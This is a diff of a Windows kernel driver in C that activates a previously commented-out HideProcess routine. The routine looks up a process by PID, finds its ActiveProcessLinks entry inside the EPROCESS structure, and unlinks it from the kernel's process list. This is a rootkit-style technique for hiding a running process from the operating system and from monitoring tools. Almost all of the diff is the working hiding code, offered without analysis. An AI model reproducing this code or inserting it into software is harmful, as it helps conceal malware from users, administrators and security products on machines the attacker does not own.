@@ -45,79 +45,79 @@ NTSTATUS HideProcess(PDEVICE_OBJECT pDeviceObj, PIRP irp) // pointer to device o
 {
 	UNREFERENCED_PARAMETER(pDeviceObj);
 
-//	irp->IoStatus.Information = 0; // if not successful
-//
-//#pragma region get passed data
-//	PVOID buffer = MmGetSystemAddressForMdlSafe(irp->MdlAddress, NormalPagePriority); // get non paged memory => this is the data passed with the request (pid)
-//	if(!buffer)
-//	{
-//		irp->IoStatus.Status = STATUS_INSUFFICIENT_RESOURCES;
-//		IoCompleteRequest(irp, IO_NO_INCREMENT);
-//		return STATUS_INSUFFICIENT_RESOURCES;
-//	}
-//
-//	DbgPrint("Process ID: %d", *(PHANDLE)buffer);
-//#pragma endregion
-//
-//#pragma region try to access process
-//	PEPROCESS Process;
-//	NTSTATUS status = PsLookupProcessByProcessId(*(PHANDLE)buffer, &Process);
-//	if(!NT_SUCCESS(status)) // if fails
-//	{
-//		DbgPrint("Error: Unable to open process object (%#x)", status);
-//		irp->IoStatus.Status = status;
-//		IoCompleteRequest(irp, IO_NO_INCREMENT);
-//		return STATUS_INSUFFICIENT_RESOURCES;
-//	}
-//#pragma endregion
-//
-//	DbgPrint("EPROCESS address: %#x", Process);
-//	PULONG ptr = (PULONG)Process;
-//
-//#pragma region scan EPROCESS for pid
-//	// Scan the EPROCESS structure for the PID
-//	ULONG offset = 0;
-//	PLIST_ENTRY CurrListEntry; //PrevListEntry, NextListEntry;
-//	for(short i = 0; i < (short)512; i++)
-//	{
-//		if(ptr[i] == *((PULONG)buffer))
-//		{
-//			offset = (ULONG)&ptr[i + 1] - (ULONG)Process; // ActiveProcessLinks is located next to the PID
-//			// after it will work try the next:
-//			CurrListEntry = (PLIST_ENTRY)((PUCHAR)&ptr[i + 1]); //(PUCHAR)Process + (ULONG)&ptr[i + 1] - (ULONG)Process
-//			DbgPrint("ActiveProcessLinks offset: %#x", offset);
-//			break;
-//		}
-//	}
-//
-//	if(!offset) // not found
-//	{
-//		irp->IoStatus.Status = STATUS_UNSUCCESSFUL;
-//		IoCompleteRequest(irp, IO_NO_INCREMENT);
-//		return STATUS_UNSUCCESSFUL;
-//	}
-//#pragma endregion
-//
-//	CurrListEntry = (PLIST_ENTRY)((PUCHAR)Process + offset); // Get the ActiveProcessLinks address
-//
-//#pragma region remove EPROCESS object
-//	// PrevListEntry = CurrListEntry->Blink;
-//	// NextListEntry = CurrListEntry->Flink;
-//	// Unlink the target process from other processes (unlink from list):
-//
-//	CurrListEntry->Blink->Flink = CurrListEntry->Flink; // point prevEPROCESS Flink to nextEPROCESS
-//	CurrListEntry->Flink->Blink = CurrListEntry->Blink; // point nextEPROCESS Blink to prevEPROCESS
-//
-//	CurrListEntry->Flink = CurrListEntry; // Point Flink and Blink to self to prevent BSOD
-//	CurrListEntry->Blink = CurrListEntry;
-//
-//	ObDereferenceObject(Process); // Dereference the target process -> decrease the reference counter
-//#pragma endregion
-//
-//	irp->IoStatus.Information = sizeof(HANDLE); // if successful there is information
-//	irp->IoStatus.Status = STATUS_SUCCESS;
-//
-//	IoCompleteRequest(irp, IO_NO_INCREMENT);
+	irp->IoStatus.Information = 0; // if not successful
+
+#pragma region get passed data
+	PVOID buffer = MmGetSystemAddressForMdlSafe(irp->MdlAddress, NormalPagePriority); // get non paged memory => this is the data passed with the request (pid)
+	if(!buffer)
+	{
+		irp->IoStatus.Status = STATUS_INSUFFICIENT_RESOURCES;
+		IoCompleteRequest(irp, IO_NO_INCREMENT);
+		return STATUS_INSUFFICIENT_RESOURCES;
+	}
+
+	DbgPrint("Process ID: %d", *(PHANDLE)buffer);
+#pragma endregion
+
+#pragma region try to access process
+	PEPROCESS Process;
+	NTSTATUS status = PsLookupProcessByProcessId(*(PHANDLE)buffer, &Process);
+	if(!NT_SUCCESS(status)) // if fails
+	{
+		DbgPrint("Error: Unable to open process object (%#x)", status);
+		irp->IoStatus.Status = status;
+		IoCompleteRequest(irp, IO_NO_INCREMENT);
+		return STATUS_INSUFFICIENT_RESOURCES;
+	}
+#pragma endregion
+
+	DbgPrint("EPROCESS address: %#x", Process);
+	PULONG ptr = (PULONG)Process;
+
+#pragma region scan EPROCESS for pid
+	// Scan the EPROCESS structure for the PID
+	ULONG offset = 0;
+	PLIST_ENTRY CurrListEntry; //PrevListEntry, NextListEntry;
+	for(short i = 0; i < (short)512; i++)
+	{
+		if(ptr[i] == *((PULONG)buffer))
+		{
+			offset = (ULONG)&ptr[i + 1] - (ULONG)Process; // ActiveProcessLinks is located next to the PID
+			// after it will work try the next:
+			CurrListEntry = (PLIST_ENTRY)((PUCHAR)&ptr[i + 1]); //(PUCHAR)Process + (ULONG)&ptr[i + 1] - (ULONG)Process
+			DbgPrint("ActiveProcessLinks offset: %#x", offset);
+			break;
+		}
+	}
+
+	if(!offset) // not found
+	{
+		irp->IoStatus.Status = STATUS_UNSUCCESSFUL;
+		IoCompleteRequest(irp, IO_NO_INCREMENT);
+		return STATUS_UNSUCCESSFUL;
+	}
+#pragma endregion
+
+	CurrListEntry = (PLIST_ENTRY)((PUCHAR)Process + offset); // Get the ActiveProcessLinks address
+
+#pragma region remove EPROCESS object
+	// PrevListEntry = CurrListEntry->Blink;
+	// NextListEntry = CurrListEntry->Flink;
+	// Unlink the target process from other processes (unlink from list):
+
+	CurrListEntry->Blink->Flink = CurrListEntry->Flink; // point prevEPROCESS Flink to nextEPROCESS
+	CurrListEntry->Flink->Blink = CurrListEntry->Blink; // point nextEPROCESS Blink to prevEPROCESS
+
+	CurrListEntry->Flink = CurrListEntry; // Point Flink and Blink to self to prevent BSOD
+	CurrListEntry->Blink = CurrListEntry;
+
+	ObDereferenceObject(Process); // Dereference the target process -> decrease the reference counter
+#pragma endregion
+
+	irp->IoStatus.Information = sizeof(HANDLE); // if successful there is information
+	irp->IoStatus.Status = STATUS_SUCCESS;
+
+	IoCompleteRequest(irp, IO_NO_INCREMENT);
 	return STATUS_SUCCESS;
 }
 
@@ -168,7 +168,6 @@ NTSTATUS DriverEntry(PDRIVER_OBJECT pDriverObj, PUNICODE_STRING pRegistryPath)
 	if (!NT_SUCCESS(createDevStatus))
 	{
 		DbgPrintEx(DPFLTR_CONFIG_ID, DPFLTR_ERROR_LEVEL, "Error: Unable to create device object (%#010x)", createDevStatus);
-		//DbgPrint("Error: Unable to create device object (%d)", createDevStatus);
 		return createDevStatus;
 	}
 	IoCreateSymbolicLink(&dosDeviceName, &DeviceName); // create symbolic link between the dos name and NT name in the object manager
